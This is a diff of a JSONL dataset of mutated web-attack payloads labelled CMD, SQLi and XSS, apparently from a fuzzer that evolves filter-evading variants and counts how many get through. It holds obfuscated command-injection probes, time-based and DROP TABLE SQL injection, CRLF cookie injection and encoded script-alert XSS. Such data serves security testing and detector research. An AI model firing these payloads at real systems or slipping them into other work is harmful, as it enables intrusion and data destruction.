@@ -1,20 +1,6 @@
-{"label": "CMD", "source": "evolve", "snippet": "&&EcHO$IFSYPPVoy$((46%2B66))$(ECHO$IFSyppVoy)YPpvOy|", "hits": 0}
-{"label": "CMD", "source": "evolve", "snippet": "%27&echo%20YHYEFI$((32%2B68))$(echo%20YHYEFI)YHYEFI\"", "hits": 0}
-{"label": "CMD", "source": "evolve", "snippet": "'&echo$IFSVXICUW$((74%2B51))$(echo$IFSVXICUW)VXICUW", "hits": 0}
-{"label": "SQLi", "source": "evolve", "snippet": "allyc%00e", "hits": 0}
-{"label": "SQLi", "source": "evolve", "snippet": "Delb%EF%BF%BDn%2BColl", "hits": 0}
-{"label": "SQLi", "source": "evolve", "snippet": "modo=insertar&prec%00io=5999&B1=Confirmar/", "hits": 0}
-{"label": "SQLi", "source": "evolve", "snippet": "costa_lejeune%40clichotel.my", "hits": 0}
-{"label": "SQLi", "source": "evolve", "snippet": "A%2BCoru%EF%BF%BDa", "hits": 0}
-{"label": "SQLi", "source": "evolve", "snippet": "Elio+C%00a�ella", "hits": 0}
-{"label": "CMD", "source": "evolve", "snippet": "&&echo$IFSZENPOV$((15%2B5))$(echo$IFSZENPOV)ZENPOV%27", "hits": 0}
-{"label": "SQLi", "source": "evolve", "snippet": "728%008239379132371", "hits": 0}
-{"label": "CMD", "source": "evolve", "snippet": "%27&echｏ%20YUMWMH$((91%2B2))$(ｅchｏ%20YUMWMH)YUMWMH|", "hits": 0}
-{"label": "SQLi", "source": "evolve", "snippet": "Bian%00ca", "hits": 0}
-{"label": "CMD", "source": "evolve", "snippet": "%27&echo$IFSLRYHAU$((84%2B4))$(e%00cho$IFSLRYHAU)LRYHAU\\", "hits": 0}
 {"label": "SQLi", "source": "evolve", "snippet": "t%00solas+", "hits": 0}
 {"label": "SQLi", "source": "evolve", "snippet": "modo=registro&login=johns&password=l�x_ico&nombre=Rooney&apellidos=Daille+Ancheyta&email=younger@tantomontamontatanto.pa", "hits": 0}
-{"label": "XSS", "source": "evolve", "snippet": "m&#105;&#116;s&#117;&#105;&#112;&#97;&#114;&#111;&#115;%22%&#50;&#48;st&#121;&#108;&#101;=%2&#50;b&#97;ckgro&#117;nd:&#1", "hits": 0}
+{"label": "XSS", "source": "evolve", "snippet": "m&#105;&#116;s&#117;&#105;&#112;&#97;&#114;&#111;&#115;%22%&#50;&#48;st&#121;&#108;&#101;=%2&#50;b&#97;ckgro&#117;nd:&#1", "hits": 7}
 {"label": "SQLi", "source": "evolve", "snippet": "C%252F%252BTimoteo%252BMartin%252C%252B24%252B7%253FG", "hits": 0}
 {"label": "SQLi", "source": "evolve", "snippet": "modo=insertar&precio=','0');waitf0x6f72+delay+'0:0:15';--&B1=Confirmar", "hits": 0}
 {"label": "SQLi", "source": "evolve", "snippet": "--WebKitFormBoundary70830\r\nContent-Disposition: form-data; name=\"q\"\r\n\r\nmodo=registro&login=dana&password=ibe2io&nombre=T", "hits": 0}
@@ -31,9 +17,9 @@
 {"label": "CMD", "source": "evolve", "snippet": "&&ec\\u0068\\u006f$\\u0049FS\\u0048HBLVW$((31%2\\u004245))$(echo$I\\u0046S\\u0048H\\u0042\\u004c\\u0056\\u0057)HH\\u0042\\u004cVW\"", "hits": 0}
 {"label": "SQLi", "source": "evolve", "snippet": "eval(atob('bW9kbz1yZWdpc3RybyZsb2dpbj12cm91d2VyZiZwYXNzd29yZD1BRA=='))eMa*DOR&nombre=Teodocio&apellidos=Feixas+Sarri�&em", "hits": 0}
 {"label": "SQLi", "source": "evolve", "snippet": "modo=registro&login=deek&passwo'+'rd=denunciado'+'ra&nombreA=Salina&apellidos=Gir�n+Cece�as&email=un-hi@tarifasdevuelos.", "hits": 0}
-{"label": "CMD", "source": "evolve", "snippet": "'&&\\u0065ch\\u006f$I\\u0046S\\u0059Z\\u0051\\u0051KL$((73%2\\u004237))$(e\\u0063\\u0068o$IF\\u0053Y\\u005aQQKL)YZ\\u0051\\u0051\\u004", "hits": 0}
+{"label": "CMD", "source": "evolve", "snippet": "'&&\\u0065ch\\u006f$I\\u0046S\\u0059Z\\u0051\\u0051KL$((73%2\\u004237))$(e\\u0063\\u0068o$IF\\u0053Y\\u005aQQKL)YZ\\u0051\\u0051\\u004", "hits": 4}
 {"label": "SQLi", "source": "evolve", "snippet": "eval(atob('bW9kbz1lbnRyYXImbG9naW49bGlsbGxpZTgmcHdkPTRtcG81OTljNw=='))miento&rememberA=on&B1=Entrar", "hits": 0}
-{"label": "SQLi", "source": "evolve", "snippet": "{\"a\":{\"b\":\"id=3&nombre=Jam�n+Ib�rico&precio=39&cantidad=56&B1=A�adir+al+carritoany%3F%0D%0ASet-cookie%3A+Tamper%3D104126", "hits": 0}
+{"label": "SQLi", "source": "evolve", "snippet": "{\"a\":{\"b\":\"id=3&nombre=Jam�n+Ib�rico&precio=39&cantidad=56&B1=A�adir+al+carritoany%3F%0D%0ASet-cookie%3A+Tamper%3D104126", "hits": 6}
 {"label": "SQLi", "source": "evolve", "snippet": "eval(atob('bW9kbz1yZWdpc3RybyZsb2dpbj0nLCcwJywnMCcpO3dhaXRmb3IrZA=='))elay+'0:0:15';--&password=e486ac0�4&nombre=Atal�va", "hits": 0}
 {"label": "SQLi", "source": "evolve", "snippet": "id=1&id=modo=entrar&login=herbie&pwd=%3F&remember=on&B1=Entrar", "hits": 0}
 {"label": "SQLi", "source": "evolve", "snippet": "Calle%2BAlfred%2BNobel%2C%2B142%2B12G", "hits": 0}
@@ -48,7 +34,7 @@
 {"label": "CMD", "source": "evolve", "snippet": "\"%0aecho%20DDWDPN$((91%2B29))$(e%00cho%20DDWDPN)DDWDPN&", "hits": 0}
 {"label": "CMD", "source": "evolve", "snippet": "\"&echo$IFSUZTQCV$((96%2B22))$(echo$IFSUZTQCV)UZTQCV%26", "hits": 0}
 {"label": "CMD", "source": "evolve", "snippet": "&echo$IFSUFORJE$((32%2B39))$(echo$IFSUFORJE)UFORJE\"", "hits": 0}
-{"label": "SQLi", "source": "evolve", "snippet": "mｏdo=+&precｉo=2814&B1=Coｎfｉrmar", "hits": 0}
+{"label": "SQLi", "source": "evolve", "snippet": "mｏdo=+&precｉo=2814&B1=Coｎfｉrmar", "hits": 1}
 {"label": "SQLi", "source": "evolve", "snippet": "modo=registro&login=evey8&passw0x6f72d=87sacar&nombre=Faustino&apellidos=Marti+Maragliano&email=almassy@schnapps.com.vg&", "hits": 0}
 {"label": "SQLi", "source": "evolve", "snippet": "--WebKitFormBoundary30018\r\nContent-Disposition: form-data; name=\"q\"\r\n\r\nmodo=entrar&login=*/vander'we&pwd=pazguat5&rememb", "hits": 0}
 {"label": "SQLi", "source": "evolve", "snippet": "modo=registro&login=lyndia&passwo'+'rd=damasceno&nombre=Temistocles&apellidos=Teruel+Villarroel&email=schneider-krymov@r", "hits": 0}
@@ -66,12 +52,12 @@
 {"label": "SQLi", "source": "evolve", "snippet": "6216%00263942492348", "hits": 0}
 {"label": "CMD", "source": "evolve", "snippet": "\"&echo$IFSKWIQTS$((57%2B77))$(echo$IFSKWIQTS)KWIQTS'", "hits": 0}
 {"label": "SQLi", "source": "evolve", "snippet": "modo=registro&login=lobianco&password=volteta&nombre=Olindo&apellidos=Robert+Malmus&email=kumar%00.prather@socimi.com.ar", "hits": 0}
-{"label": "SQLi", "source": "evolve", "snippet": "{\"a\":{\"b\":\"modo=entrar&login=temp&pwd=tel7tipo%3F&remember=off&B1=Entrar\"}}", "hits": 0}
+{"label": "SQLi", "source": "evolve", "snippet": "{\"a\":{\"b\":\"modo=entrar&login=temp&pwd=tel7tipo%3F&remember=off&B1=Entrar\"}}", "hits": 5}
 {"label": "SQLi", "source": "evolve", "snippet": "modo=registro&login=onder&password=cORT�SMenTE&nombre=Pancracio&apellidos=Joves+Sagreras&email=%2B&dni=20934634B&direcci", "hits": 0}
 {"label": "SQLi", "source": "evolve", "snippet": "--WebKitFormBoundary80226\r\nContent-Disposition: form-data; name=\"q\"\r\n\r\nmodo=entrar','0','0','0');waitfor+delay+'0:0:15';", "hits": 0}
 {"label": "SQLi", "source": "evolve", "snippet": "--WebKitFormBoundary89871\r\nContent-Disposition: form-data; name=\"q\"\r\n\r\nmodo=registro&login=baughan&password=piache&nombr", "hits": 0}
 {"label": "CMD", "source": "evolve", "snippet": "&e\\u0063\\u0068o$\\u0049\\u0046SY\\u0056\\u0050JG\\u0051$((92%2B10))$(ec\\u0068\\u006f$I\\u0046S\\u0059VP\\u004aG\\u0051)YVP\\u004aG\\", "hits": 0}
-{"label": "CMD", "source": "evolve", "snippet": "--WebKitFormBoundary71971\r\nContent-Disposition: form-data; name=\"q\"\r\n\r\n|echo%20DTKVRT$((20%2B98))$(echo%20DTKVRT)DTKVRT&", "hits": 0}
+{"label": "CMD", "source": "evolve", "snippet": "--WebKitFormBoundary71971\r\nContent-Disposition: form-data; name=\"q\"\r\n\r\n|echo%20DTKVRT$((20%2B98))$(echo%20DTKVRT)DTKVRT&", "hits": 1}
 {"label": "SQLi", "source": "evolve", "snippet": "Turet%2BMaiorana", "hits": 0}
 {"label": "SQLi", "source": "evolve", "snippet": "--WebKitFormBoundary81416\r\nContent-Disposition: form-data; name=\"q\"\r\n\r\nmodo=%7C&precio=1713&B1=Pasar+por+caja\r\n--WebKitF", "hits": 0}
 {"label": "SQLi", "source": "evolve", "snippet": "id=1&id=Credenciales+incorrectasany%0D%0ASet-cookie%3A+Tamper%3D5765205567234876235", "hits": 0}
@@ -91,7 +77,7 @@
 {"label": "SQLi", "source": "evolve", "snippet": "ｉd=3|&nombrｅ=Vｉｎｏ+Rｉｏja&prｅcｉｏ=85&caｎｔｉdad=4&B1=A�adｉr+al+carrｉｔo", "hits": 0}
 {"label": "SQLi", "source": "evolve", "snippet": "Mar%00roig+Cuadra", "hits": 0}
 {"label": "CMD", "source": "evolve", "snippet": "\"&echo$iFSiZIkXP$((4%2B56))$(eChO$ifsiZiKxP)iZIKXp%5c%5c", "hits": 0}
-{"label": "SQLi", "source": "evolve", "snippet": "{\"a\":{\"b\":\"modo=entrar&login=nancie&pwd=%2B&remember=on&B1=Entrar\"}}", "hits": 0}
+{"label": "SQLi", "source": "evolve", "snippet": "{\"a\":{\"b\":\"modo=entrar&login=nancie&pwd=%2B&remember=on&B1=Entrar\"}}", "hits": 6}
 {"label": "SQLi", "source": "evolve", "snippet": "modo=registro&login=san??ks&password=aocar&nombre=Romari&apellidos=Astorga&email=laine-devlin@telogis.tl&dni=38236531C&d", "hits": 0}
 {"label": "SQLi", "source": "evolve", "snippet": "okeefe.g%00ilger0@ajuntamentdebarcelona2-0.in", "hits": 0}
 {"label": "SQLi", "source": "evolve", "snippet": "eval(atob('aWQ9MyZub21icmU9VmlubytSaW9qYSZwcmVjaW89ODUvJmNhbnRpZA=='))ad=5&B1=A�adir+al+carrito", "hits": 0}
@@ -105,7 +91,7 @@
 {"label": "CMD", "source": "evolve", "snippet": "&echo$IFSHBNWJW$((1%008%2B27))$(echo$IFSHBNWJW)HBNWJW%26", "hits": 0}
 {"label": "CMD", "source": "evolve", "snippet": "&&ECHO%20siYjrm$((59%2B4))$(ECHo%20SIyjrM)siyJrm%7c", "hits": 0}
 {"label": "CMD", "source": "evolve", "snippet": "&ECHO$IFsgQpcYE$((3%2B64))$(ecHO$IfSGQPcyE)gQpcye'", "hits": 0}
-{"label": "XSS", "source": "evolve", "snippet": "--WebKitFormBoundary37744\r\nContent-Disposition: form-data; name=\"q\"\r\n\r\n'';!--\"<XSS>=&{()}\r\n--WebKitFormBoundary37744--", "hits": 0}
+{"label": "XSS", "source": "evolve", "snippet": "--WebKitFormBoundary37744\r\nContent-Disposition: form-data; name=\"q\"\r\n\r\n'';!--\"<XSS>=&{()}\r\n--WebKitFormBoundary37744--", "hits": 4}
 {"label": "CMD", "source": "evolve", "snippet": "\"&&eCho%20iOUKTy$((23%2B26))$(echO%20IOUkTY)IOukty%7C", "hits": 0}
 {"label": "CMD", "source": "evolve", "snippet": "&&echo%20STFNSK$((89%2B70))$(echo%20STFNSK)STFNSK%7C", "hits": 0}
 {"label": "SQLi", "source": "evolve", "snippet": "modo=insertar&precio=7744&B1=';+DROP+TABLE+usuarios;+/*!50000SELECT*/+*+/*!50000FROM*/+datos+/*!50000WHERE*/+nombre+LIKE", "hits": 0}
@@ -118,7 +104,7 @@
 {"label": "SQLi", "source": "evolve", "snippet": "lindberg_loeb%2540showcars.com.name", "hits": 0}
 {"label": "CMD", "source": "evolve", "snippet": "--WebKitFormBoundary69707\r\nContent-Disposition: form-data; name=\"q\"\r\n\r\n%0aecho%20OJUIJZ$((60%2B38))$(echo%20OJUIJZ)OJUIJ", "hits": 0}
 {"label": "CMD", "source": "evolve", "snippet": "%27&&echo$IFSOOJWHW$((27%2B7))$(echo$IFSOOJWHW)OOJWHW|", "hits": 0}
-{"label": "SQLi", "source": "evolve", "snippet": "%00Agaete", "hits": 0}
+{"label": "SQLi", "source": "evolve", "snippet": "%00Agaete", "hits": 29}
 {"label": "CMD", "source": "evolve", "snippet": "'echo%20ZQODFO$((38%2B30))$(ech%00o%20ZQODFO)ZQODFO%26", "hits": 0}
 {"label": "SQLi", "source": "evolve", "snippet": "Mardoque%00o", "hits": 0}
 {"label": "SQLi", "source": "evolve", "snippet": "ca%EF%BF%BDucela", "hits": 0}
@@ -148,7 +134,7 @@
 {"label": "SQLi", "source": "evolve", "snippet": "Credenciales+incorrectas%20", "hits": 0}
 {"label": "SQLi", "source": "evolve", "snippet": "modo=registro&login=jagath&password=azOrR1RsE&nombreA=Sili&apellidos=Masl%00o+Arrunategui&email=davray.chayevsky4@sierra", "hits": 0}
 {"label": "SQLi", "source": "evolve", "snippet": "Ita%00llia%3F", "hits": 0}
-{"label": "SQLi", "source": "evolve", "snippet": "Andr%00eas", "hits": 0}
+{"label": "SQLi", "source": "evolve", "snippet": "Andr%00eas", "hits": 1}
 {"label": "CMD", "source": "evolve", "snippet": "&echo$IFSLMIPEM$((82%2B21))$(echo$IFSLMIPEM)LMIPEM%22", "hits": 0}
 {"label": "SQLi", "source": "evolve", "snippet": "Matar%EF%BF%BD%2BI%EF%BF%BDiguez", "hits": 0}
 {"label": "CMD", "source": "evolve", "snippet": "\"&\\u0065c\\u0068o%20TFMD\\u0047\\u004e$((33%2B82))$(\\u0065cho%20\\u0054FMD\\u0047\\u004e)\\u0054\\u0046\\u004dDG\\u004e%27", "hits": 0}
@@ -167,16 +153,16 @@
 {"label": "SQLi", "source": "evolve", "snippet": "Isart%2BViva", "hits": 0}
 {"label": "SQLi", "source": "evolve", "snippet": "Esteba%2BEstradera", "hits": 0}
 {"label": "SQLi", "source": "evolve", "snippet": "modo=registro&login=alis0x616e64e6&passw0x6f72d=aviad0x6f72a&nombre=Rosendo&apellidosA=Schulz+De+Buran&email=geldart5@c0", "hits": 0}
-{"label": "CMD", "source": "evolve", "snippet": "&&echo$IFSTGBJOB$((42%2B77))$(echo$IFSTGBJOB)TGBJOB%26", "hits": 0}
+{"label": "CMD", "source": "evolve", "snippet": "&&echo$IFSTGBJOB$((42%2B77))$(echo$IFSTGBJOB)TGBJOB%26", "hits": 2}
 {"label": "CMD", "source": "evolve", "snippet": "&&echo%%0020ECAYHK$((20%2B55))$(echo%20ECAYHK)ECAYHK|", "hits": 0}
 {"label": "SQLi", "source": "evolve", "snippet": "%00charo", "hits": 0}
 {"label": "SQLi", "source": "evolve", "snippet": "Capo%2BGarc%EF%BF%BDa", "hits": 0}
 {"label": "SQLi", "source": "evolve", "snippet": "modo=registro&login=+stan+ly&passw0x6f72d=49pu+22&nombre=Lavinia&apellidos=Preisz&email=carslisle@cirujanaplastica.ck&dn", "hits": 0}
 {"label": "SQLi", "source": "evolve", "snippet": "--WebKitFormBoundary56037\r\nContent-Disposition: form-data; name=\"q\"\r\n\r\nmodo=registro&login=pravato&password=rastrero&nom", "hits": 0}
 {"label": "SQLi", "source": "evolve", "snippet": "eval(atob('bW9kbz1yZWdpc3RybyZsb2dpbj1kZW1wc2V5JnBhc3N3b3JkPWNBQg=='))ALlaZo&nombre=Atila&apellidos=Gorgone+Oteo&email=p", "hits": 0}
-{"label": "SQLi", "source": "evolve", "snippet": "id=1&id=167513E6178E1B599011E034262815CD", "hits": 0}
+{"label": "SQLi", "source": "evolve", "snippet": "id=1&id=167513E6178E1B599011E034262815CD", "hits": 22}
 {"label": "SQLi", "source": "evolve", "snippet": "--WebKitFormBoundary27649\r\nContent-Disposition: form-data; name=\"q\"\r\n\r\nmodo=registro&login=armand&password=prusiato&nomb", "hits": 0}
-{"label": "CMD", "source": "evolve", "snippet": "&echo%20DRUCFI$((69%2B56))$(echo%20DRUCFI)DRUCFI", "hits": 0}
+{"label": "CMD", "source": "evolve", "snippet": "&echo%20DRUCFI$((69%2B56))$(echo%20DRUCFI)DRUCFI", "hits": 1}
 {"label": "SQLi", "source": "evolve", "snippet": "Calle%2BSol%2B188%2B9-H", "hits": 0}
 {"label": "CMD", "source": "evolve", "snippet": "&&\\u0065\\u0063ho$\\u0049FS\\u0051\\u0047ZOTF$((32%2\\u004238))$(echo$IF\\u0053Q\\u0047ZOTF)Q\\u0047\\u005aOTF%5\\u0043%5C", "hits": 0}
 {"label": "SQLi", "source": "evolve", "snippet": "modo=registro&login=sherri&passwo'+'rd=ADj9d8cAt0r55&nombre=Amaru&apellidos=Gilabert&email=chimento@fuzzy.bb&dni=6636578", "hits": 0}
@@ -194,7 +180,21 @@
 {"label": "SQLi", "source": "evolve", "snippet": "modo=insertar&precio=','0','0','0')%00;waitfor+delay+'0:0:15';--&B1=Pasar+por+caja", "hits": 0}
 {"label": "SQLi", "source": "evolve", "snippet": "id=1&nombre=Jam�n+Ib�rico&precio=85&cantidad=91&B1=A�adir+al+carrito','0','0');waitfo'+'r+delay+'0:0:15';--", "hits": 0}
 {"label": "SQLi", "source": "evolve", "snippet": "Yul%00isa", "hits": 0}
-{"label": "SQLi", "source": "evolve", "snippet": "id=1&id=33908887Xany%3F%0D%0ASet-cookie%3A+Tamper%3D1041264011025374727", "hits": 0}
+{"label": "SQLi", "source": "evolve", "snippet": "id=1&id=33908887Xany%3F%0D%0ASet-cookie%3A+Tamper%3D1041264011025374727", "hits": 4}
 {"label": "SQLi", "source": "evolve", "snippet": "Odil%00a", "hits": 0}
 {"label": "CMD", "source": "evolve", "snippet": "&e\\u0063\\u0068o$IFSBGJ\\u0046\\u004d\\u0056$((55%2\\u004292))$(e\\u0063h\\u006f$\\u0049\\u0046S\\u0042G\\u004aF\\u004dV)BGJFM\\u0056", "hits": 0}
 {"label": "SQLi", "source": "evolve", "snippet": "mｏdo=regｉｓｔrｏ&login=aｌｏｉsｅ&paｓsword=ｅｎｔrｅdob'l'e&ｎombrｅ=Gaｌindo&apeｌｌｉdｏs=Lafｏｎｔ+Vi�aｌｏn&ｅmaiｌ=pｅreda@sｔreaptｅasｅ.nr&dni", "hits": 0}
+{"label": "XSS", "source": "auto_evolve", "snippet": "id=1&ID=<sCrIPt>ALERT(1)</scrIpt>", "hits": 55}
+{"label": "XSS", "source": "auto_evolve", "snippet": "<img src=x onerror=\"id=1&id=<script>alert(1)</script>\">", "hits": 27}
+{"label": "SQLi", "source": "auto_evolve", "snippet": "78C6634Aa96632AeB2D2aF1feAa5462D", "hits": 31}
+{"label": "XSS", "source": "auto_evolve", "snippet": "&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&#60;&#47;&#115;&#99;&#114;&#10", "hits": 0}
+{"label": "SQLi", "source": "auto_evolve", "snippet": "Ee024deacfE44c1a94D08633F7EdABe4", "hits": 5}
+{"label": "XSS", "source": "auto_evolve", "snippet": "&#6&#48;;&#11&#53;;&#&#57;&#57;;&#&#49;&#49;4;&#105;&#&#49;&#49;2;&#1&#49;6;&#&#54;2;&#&#57;&#55;;&#&#49;08;&#&#49;0&#49", "hits": 0}
+{"label": "XSS", "source": "auto_evolve", "snippet": "id=1&i‍d‍=&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&#60;&#47;&#115;&#99;", "hits": 0}
+{"label": "SQLi", "source": "auto_evolve", "snippet": "A7220750F5E37933ED338D6c9F777C75", "hits": 0}
+{"label": "SQLi", "source": "auto_evolve", "snippet": "e20a1E467865f3D0F006370a246B5C95", "hits": 0}
+{"label": "SQLi", "source": "auto_evolve", "snippet": "bEa54A03f81671eD2dFB680868d3cF37", "hits": 0}
+{"label": "XSS", "source": "auto_evolve", "snippet": "id=&#49;&id=&#60;&#&#49;15;&#&#57;&#57;;&#114;&#10&#53;;&#112;&#&#49;&#49;&#54;;&#62;&#&#57;&#55;;&#&#49;&#48;8;&#&#49;&", "hits": 0}
+{"label": "XSS", "source": "auto_evolve", "snippet": "%2526%25236%2526%252348%253B%253B%2526%252311%2526%252353%253B%253B%2526%2523%2526%252357%253B%2526%252357%253B%253B%252", "hits": 0}
+{"label": "XSS", "source": "auto_evolve", "snippet": "&#38;&#35;&#54;&#38;&#35;&#52;&#56;&#59;&#59;&#38;&#35;&#49;&#49;&#38;&#35;&#53;&#51;&#59;&#59;&#38;&#35;&#38;&#35;&#53;", "hits": 0}
+{"label": "XSS", "source": "auto_evolve", "snippet": "&#105;&#100;&#61;&#49;&#38;&#105;&#100;&#61;&#38;&#35;&#54;&#48;&#59;&#38;&#35;&#49;&#49;&#53;&#59;&#38;&#35;&#57;&#57;&", "hits": 0}
